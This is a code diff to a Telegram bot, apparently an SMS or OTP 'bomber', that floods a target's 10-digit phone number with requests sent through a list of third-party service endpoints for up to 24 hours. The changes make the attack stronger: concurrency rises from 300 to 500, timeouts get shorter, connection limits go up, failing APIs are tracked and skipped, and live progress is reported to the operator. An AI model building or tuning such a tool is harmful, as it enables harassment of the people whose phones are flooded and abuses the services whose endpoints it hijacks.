@@ -8,6 +8,7 @@ import uuid
 import hmac
 import hashlib
 import base64
+import collections
 from typing import Optional
 
 import aiohttp
@@ -20,17 +21,16 @@ from starlette.responses import PlainTextResponse, Response
 from starlette.routing import Route
 import uvicorn
 
-# ================== CONFIG ==================
+# ================== CONFIG (ULTRA FAST) ==================
 BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
 WEBHOOK_URL = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
 PORT        = int(os.environ.get("PORT", 8000))
 
-# ULTRA FAST + 24H MODE
-CONCURRENCY     = 300              # 300 parallel requests per batch
+CONCURRENCY     = 500              # 500 parallel per batch
 DELAY           = 0.0              # no sleep between batches
-REQUEST_TIMEOUT = 8                # per-request timeout
-MAX_DURATION    = 24 * 60 * 60     # 24 hours hard cap (86400 sec)
-# ============================================
+REQUEST_TIMEOUT = 3                # fast-fail dead APIs
+MAX_DURATION    = 24 * 60 * 60     # 24h hard cap
+# =========================================================
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger("tsunami")
@@ -39,13 +39,16 @@ user_sessions: dict = {}
 _http_session: Optional[aiohttp.ClientSession] = None
 telegram_app: Optional[Application] = None
 
+# Dead-API tracking
+_api_stats = collections.defaultdict(lambda: {"fail": 0, "skip_until": 0.0})
+
 
 def is_valid_target(num: str) -> bool:
     return num.isdigit() and len(num) == 10 and num[0] in "6789"
 
 
 # =========================================================================
-#  ULTIMATE APIS (single clean build_endpoints)
+#  ENDPOINT LIST
 # =========================================================================
 def build_endpoints():
     UA_D = "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
@@ -180,13 +183,40 @@ def build_endpoints():
 ENDPOINTS = build_endpoints()
 
 
+# ================== DEAD-API TRACKING ==================
+def _is_alive(ep_name: str) -> bool:
+    st = _api_stats[ep_name]
+    return time.time() >= st["skip_until"]
+
+
+def _record(ep_name: str, ok: bool):
+    st = _api_stats[ep_name]
+    if ok:
+        st["fail"] = 0
+    else:
+        st["fail"] += 1
+        if st["fail"] >= 5:
+            st["skip_until"] = time.time() + 600   # 10 min skip
+            st["fail"] = 0
+
+
 # ================== HTTP SESSION ==================
 async def get_http_session() -> aiohttp.ClientSession:
     global _http_session
     if _http_session is None or _http_session.closed:
-        connector = aiohttp.TCPConnector(limit=500, limit_per_host=80, ssl=False)
-        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
-        _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
+        connector = aiohttp.TCPConnector(
+            limit=1000,
+            limit_per_host=150,
+            ttl_dns_cache=300,
+            ssl=False,
+            enable_cleanup_closed=True,
+        )
+        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=2)
+        _http_session = aiohttp.ClientSession(
+            connector=connector,
+            timeout=timeout,
+            headers={"Accept": "*/*"},
+        )
     return _http_session
 
 
@@ -217,8 +247,11 @@ async def fire_endpoint(ep: dict, target: str) -> bool:
         session = await get_http_session()
         async with session.request(method=ep["method"], url=url, headers=headers, data=data if data else None, ssl=False) as resp:
             await resp.read()
-            return resp.status in (200, 201, 202)
+            ok = resp.status in (200, 201, 202)
+            _record(ep["name"], ok)
+            return ok
     except Exception:
+        _record(ep["name"], False)
         return False
 
 
@@ -290,7 +323,21 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     asyncio.create_task(run_bombing(uid, s))
 
 
-# ================== BOMBING LOGIC (24H + ULTRA FAST) ==================
+# ================== PROGRESS HELPER ==================
+async def _send_progress(uid, target, sent, elapsed, rnd, alive_count):
+    try:
+        await telegram_app.bot.send_message(
+            uid,
+            f"📊 **Live** — `{target}`\n"
+            f"📨 *{sent}* sent | ⏱ {int(elapsed)//60}m | 🔄 {rnd} rounds\n"
+            f"🟢 Alive APIs: {alive_count}/{len(ENDPOINTS)}",
+            parse_mode="Markdown"
+        )
+    except Exception:
+        pass
+
+
+# ================== BOMBING LOGIC ==================
 async def run_bombing(uid: int, s: dict):
     target = s["target"]
     sent = 0
@@ -306,37 +353,27 @@ async def run_bombing(uid: int, s: dict):
                 break
 
             s["round"] += 1
-            batch = [ENDPOINTS[(idx + i) % len(ENDPOINTS)] for i in range(CONCURRENCY)]
+
+            # Build batch from alive APIs only
+            alive = [e for e in ENDPOINTS if _is_alive(e["name"])]
+            if not alive:
+                alive = ENDPOINTS   # reset if all dead
+            n = len(alive)
+            batch = [alive[(idx + i) % n] for i in range(CONCURRENCY)]
             idx += CONCURRENCY
 
             ok = await _fire_batch(batch, target)
             sent += ok
             s["sent"] = sent
 
-            # Live progress every 60s
+            # Non-blocking progress every 60s
             now = time.time()
             if now - last_report >= 60:
                 last_report = now
-                try:
-                    bot = Bot(token=BOT_TOKEN)
-                    elapsed = int(now - start)
-                    await bot.send_message(
-                        uid,
-                        f"📊 **Live Progress**\n"
-                        f"🎯 `{target}`\n"
-                        f"📨 Sent: *{sent}*\n"
-                        f"⏱ Elapsed: {elapsed//60}m {elapsed%60}s\n"
-                        f"🔄 Round: {s['round']}",
-                        parse_mode="Markdown"
-                    )
-                except Exception:
-                    pass
+                asyncio.create_task(_send_progress(uid, target, sent, now - start, s["round"], n))
 
-            # yield so stop button remains responsive
-            if DELAY > 0:
-                await asyncio.sleep(DELAY)
-            else:
-                await asyncio.sleep(0)
+            # yield to event loop so stop button stays responsive
+            await asyncio.sleep(0)
 
     except Exception as e:
         logger.exception(f"Bombing error: {e}")
@@ -344,7 +381,6 @@ async def run_bombing(uid: int, s: dict):
         s["running"] = False
 
     try:
-        bot = Bot(token=BOT_TOKEN)
         elapsed = int(time.time() - start)
         if s.get("cancelled"):
             reason = "🛑 **Stopped by you**"
@@ -352,13 +388,16 @@ async def run_bombing(uid: int, s: dict):
             reason = "⏰ **24-Hour limit reached — auto stopped**"
         else:
             reason = "✅ **Finished**"
-        await bot.send_message(
+
+        alive_count = sum(1 for e in ENDPOINTS if _is_alive(e["name"]))
+        await telegram_app.bot.send_message(
             uid,
             f"{reason}\n\n"
             f"🎯 Target: `{target}`\n"
             f"📨 Total Sent: *{sent}*\n"
             f"⏱ Duration: {elapsed//3600}h {(elapsed%3600)//60}m {elapsed%60}s\n"
-            f"🔄 Rounds: {s['round']}",
+            f"🔄 Rounds: {s['round']}\n"
+            f"🟢 Alive APIs: {alive_count}/{len(ENDPOINTS)}",
             parse_mode="Markdown"
         )
     except Exception:
